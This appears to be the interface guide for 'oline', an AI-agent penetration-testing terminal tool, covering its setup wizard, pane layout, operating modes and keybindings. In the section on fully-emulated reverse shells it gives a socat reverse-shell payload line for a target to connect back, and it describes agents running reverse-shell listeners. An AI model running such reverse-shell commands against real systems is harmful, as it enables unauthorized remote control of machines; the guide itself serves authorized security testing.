# The interface

oline is a full-screen terminal program. It opens with a setup wizard, then shows
the running engagement view. It works with the keyboard and the mouse.

## Splash screen

If your terminal supports Sixel graphics, oline shows the logo on a splash screen
before the wizard; otherwise it shows an ANSI version. Force it on or off with
`OLINE_SIXEL=1` or `OLINE_SIXEL=0`.

## Setup wizard

The wizard asks for the engagement settings in order; steps that do not apply are
skipped. Press Enter to advance.

1. **Mode**: pentester or exploiter.
2. **Models**: oline ships with no provider, so on the first run this is a form that
   defines one: the provider name, base URL, and API key, plus a model for each tier
   (`big`, `medium`, `small`) with its id, context window, max tokens, whether it is
   a reasoning model, and its prices. The fields are prefilled with an OpenAI
   example; the medium and small tiers can reuse the tier above. Your choices are
   saved, so later runs skip this step (or, when a provider already exists but the
   tiers are unset, show a short picker instead). Up/down or Tab move between fields,
   left/right or Space toggle, Enter saves.
3. **API key**: shown only if a chosen model's provider still has no key (for
   example you left the key blank). Saved to `secrets.yml`.
4. **Start**: a new engagement, or resume a previous one.
5. **Environment**: pick a sandbox. The wizard lists WSL distros and QEMU images
   and offers a "create new" option. See [sandbox.md](sandbox.md).
6. **Resume / import**: when resuming, pick an existing engagement in the sandbox
   or import one from a host archive, then choose whether to load its saved history.
7. **Scope**: the in-scope targets. Free text; IPs, CIDRs, and domains are parsed
   out (for example `10.0.0.0/24 and app.example.com`). IPs and CIDRs drive the
   firewall; domains are used for tool-layer checks and reporting.
8. **Goal**: a short description of what the engagement should achieve. When
   resuming, the saved goal is kept and this step instead takes optional extra
   instructions for the resumed run (leave it blank to skip).
9. **VPN** (optional): point oline at an OpenVPN config so the sandbox connects
   through a VPN before agents start. WSL only.
10. **Automation**: pick automatic, planner, or watcher (see [Modes](#modes)
    below). You can switch while running with `Ctrl-b m`.

## Running view

The default layout tiles panes like tmux:

```
+----------------------+------------------+-------------------+
|                      |  summary         |  Options pane     |
|  orchestrator        |  (live)          |  (roster + help)  |
|  transcript          +------------------+                   |
|                      |  diagram         |                   |
|                      |  (live)          |                   |
+----------------------+------------------+-------------------+
|  scope / status bar                                         |
|  command line                                               |
+-------------------------------------------------------------+
```

- The left pane follows the orchestrator.
- The center stacks two read-only panes:
  - **Summary** (top): the orchestrator's current state of play, in Markdown.
    `Ctrl-b s` asks it to refresh both this and the Diagram pane now.
  - **Diagram** (bottom): an ASCII map the orchestrator draws (a network map in
    pentester mode, a software-component map in exploiter mode). `Ctrl-b d` asks it
    to refresh just this pane now (`Ctrl-b s` refreshes both). It is shown verbatim
    in monospace; lines wider than the pane are clipped, so zoom the pane
    (`Ctrl-b z`) to see a large map.
  Both panes are read-only; focus an agent to type a message.
- The right **Options** pane (toggle with `Ctrl-b ?`) lists, in order: a **user
  panes** section with the shells you have opened; an **info panes** section with
  Main, Summary, and Diagram; then **active** and **idle subagents**. Each agent
  row shows its state, how much of its context window it has used, and, for a
  running agent with a time budget, a countdown of the time left.
- Click an info pane or a subagent, or arrow onto it, to show it in the focused
  pane. This is also how you reopen a Summary or Diagram pane you closed.
- A subagent's pane begins with the task prompt the orchestrator gave it; scroll to
  the top to read it.
- The status bar shows the roster, scope, environment, the operating mode
  (automatic / planner / watcher), and the concurrency count.
- The command line sends a message to the focused agent. When a shell pane is
  focused it runs commands instead.

Markdown renders as it streams. Agent thoughts are hidden by default (`Ctrl-b t`
toggles). Click a tool call to expand it and see the full command and its output.

### Mouse

- Click a pane to focus it; click a tool call to expand or collapse it.
- Click a window tab in the header to switch to that window.
- Drag the border between two panes to resize them.
- Drag one pane onto another to swap what they show.
- The wheel scrolls the pane under the cursor; over the Options pane it scrolls the
  roster.

## Modes

The engagement runs in one of three operating modes, shown in the status bar. Pick
one in the setup wizard, and switch at any time while running with `Ctrl-b m` (it
cycles automatic to planner to watcher); the change takes effect immediately and the
AI is told so it adapts.

- **Automatic**: the AI runs the engagement end to end on its own, pausing only for
  its built-in gates (destructive actions, scope ambiguity, when it is unsure).
- **Planner**: the AI proposes each step and waits for your explicit approval before
  anything runs, one approved step at a time.
- **Watcher**: you run everything yourself in the terminal panes; the AI executes
  nothing. `bash`, `bash_bg`, and `revshell` are hard-blocked for every agent, so
  "no automation" is a guarantee, not just a prompt. The AI watches, keeps notes, and
  advises, and it may still read and write files in the engagement workspace. It does
  not ingest your terminals on its own: when you want its read on what is on a screen,
  focus that pane and press `Ctrl-b a` to share the pane's current content with the
  orchestrator. `Ctrl-b a` works in any mode.

## Keybindings

Press `Ctrl-b`, then one of these keys:

| key | action |
|---|---|
| `%` / `\|` | split the focused pane across |
| `"` / `-` | split the focused pane down |
| arrows / `hjkl` | move between panes |
| `o` | cycle panes |
| `g` / `G` | jump the focused pane to the top / bottom |
| `z` | zoom the focused pane |
| `x` | close the focused pane |
| `$` | open a shell pane (line-oriented) |
| `T` | open a fully terminal-emulated pane (vim/htop work) |
| `L` | open a fully-emulated reverse-shell catcher (enter a port) |
| `[` | copy mode |
| `c` | new window (tab) |
| `n` | next window |
| `1`-`9`, `0` | jump to window N (`0` is window 10) |
| `&` | close the current window |
| `p` / `P` | pause the focused agent / all agents |
| `r` / `R` | resume the focused agent / all agents |
| `K` | kill the focused agent, or a command pane's backing process (listener / reverse shell / command) |
| `S` | stop the commands the focused agent (or shell) is running |
| `s` | refresh the Summary and Diagram panes now |
| `d` | refresh the Diagram pane now |
| `t` | toggle agent thoughts |
| `m` | cycle the operating mode (automatic / planner / watcher) |
| `a` | share the focused pane's current content with the AI |
| `b` | change the focused agent's time budget |
| `e` | open the model/provider editor |
| `?` | show or hide the Options pane |
| `q` | quit |

Without the prefix: up/down move the focused pane through the Options list, the
wheel scrolls the transcript, and typing plus Enter sends a message to the focused
agent (or runs a command in a focused shell pane).

### Windows (tabs)

`Ctrl-b c` opens a new window, `Ctrl-b n` cycles to the next, `Ctrl-b 1` to
`Ctrl-b 9` jump by number, and `Ctrl-b &` closes the current one (not the last). When
more than one window exists, a tab strip appears in the header; click a tab to switch
to it.

By default the tabs have fixed identities that constrain the kind of pane they hold,
and the Options sidebar shows only the relevant choices for the active tab:

- **Info** (tab 1): the orchestrator plus the live Summary and Diagram. Its panes
  only ever show those info views.
- **Subagents** (tab 2): the subagent panes, arranged automatically (below). Its
  panes only ever show subagents.
- **Shell** (tab 3 and any you open with `Ctrl-b c`): command panes (shells,
  terminals, reverse-shell channels). It starts with one shell pane.

You can resize and split panes and switch a pane's view on any tab; you just can't
bring a different category of pane onto a tab (for example a subagent onto the Info
tab). To get the old free-form behavior back, turn on **Customizable Panes** in the
settings editor (below).

#### The Subagents auto-layout

The Subagents tab arranges spawned subagents on its own. The first subagent opens a
single pane; the second splits it left/right; the third splits the left pane into
top/bottom; the fourth splits the right pane into top/bottom. Once all four panes
exist, the next subagent takes over the pane showing the oldest subagent. You can
resize the panes, split more, and switch a pane to a different subagent; the
auto-layout keeps holding, so the next spawn still replaces the oldest.

### Command panes

The **command panes** section of the Options sidebar lists the panes you can type
into directly: your own shell panes, fully terminal-emulated panes, and the agents'
reverse-shell channels.

**Shell panes.** `Ctrl-b $` opens a line-oriented shell pane that runs commands in
the sandbox as root. With a shell pane focused, the input line shows a `$` prompt;
type a command and press Enter, and the output appears in the pane. The working
directory is kept across commands. `Ctrl-b S` stops a running command. This is the
quick, scriptable shell; for full-screen programs use a terminal pane. The egress
firewall restricts agents, not your own shell.

**Terminal panes (full emulation).** `Ctrl-b T` opens a fully terminal-emulated
pane: a real pseudo-terminal in the sandbox driven by a VT emulator, so vim, htop,
less, tmux and anything else that drives the terminal work exactly as in a native
terminal. While a terminal pane is focused, every keystroke goes straight to the
program; `Ctrl-b` is the one exception, held back as oline's prefix (press
`Ctrl-b` twice to send a literal `Ctrl-b`). The pane resizes with the layout (live
on the QEMU backend; fixed at open on WSL). It needs `script` (util-linux) on the
WSL backend; QEMU uses the SSH server's own PTY.

**Fully-emulated reverse shells.** `Ctrl-b L` asks for a TCP port and opens a
terminal pane that listens for a reverse shell on it with a PTY on both ends (via
`socat`), so a caught shell is a real interactive terminal, not a line pipe. Have the
target connect back with a PTY payload, for example:

```
socat tcp:<your-ip>:<port> exec:'bash -li',pty,stderr,setsid,sigint,sane
```

`socat` must be installed in the sandbox. This is the operator's full-emulation path
and is separate from the agents' line-oriented `revshell` channels below (which they
drive programmatically).

**Reverse-shell channels.** When an agent sets up a reverse-shell listener (with its
`revshell` tool), the channel appears in the command-panes list as a `⇄` row with
its name and port. Click the row to open a pane that streams the channel's live
output; the row shows `(click to open)` until you do. With that pane focused the
input line shows a `⇄` prompt, and a command you type is sent straight to the shell
connected on the far end. The channel's listener is managed by the agents (they open
and close it); the pane is just your window onto it, and closing the pane leaves the
listener running.

### Pause, resume, and kill

`Ctrl-b p` pauses the focused agent immediately, cancelling its model stream and
the command it is running; `Ctrl-b r` resumes it. `Ctrl-b P` pauses everything and
stops new agents from spawning; `Ctrl-b R` resumes everything. `Ctrl-b K` kills the
focused agent; on a command pane it kills what that pane is backed by instead and
closes it: a terminal pane's PTY session (its shell, listener, or caught reverse
shell), a reverse-shell channel's listener, or a shell pane's running command.

### Stop a command

`Ctrl-b S` stops whatever command the focused agent (or shell) is running, without
pausing or killing the agent.

### Copy mode

`Ctrl-b [` shows the focused agent's transcript as plain full-screen text so you
can select and copy it. Arrows, PgUp, PgDn, and the wheel scroll; Esc exits.

### Change scope while running

`Ctrl-b e`, then edit the scope item. Changing the in-scope targets while agents
run re-applies the firewall and tells the orchestrator the allowed scope changed.

### Edit a prompt

`Ctrl-b e` lists every agent plus the orchestrator's `system prompt`, `personality`,
and (pentester) `methodology`. Select one and press Enter to edit it in a box; `Tab`
moves between fields and the box, `alt+up` / `alt+down` resize it, and `Ctrl+S`
saves. See [configuration.md](configuration.md#the-in-app-editor).

### TUI settings

`Ctrl-b e` also lists a `tui` item, `customizable panes`. Set it to `true` to turn
off the fixed Info / Subagents / Shell tabs and the Subagents auto-layout: every tab
becomes free-form with numeric names, any pane can show anything, and nothing is
enforced. It is `false` by default and applies to the next engagement.

### Change a time budget while running

Focus an agent, press `Ctrl-b b`, and type minutes (or `none` to remove the limit).
See [agents.md](agents.md).
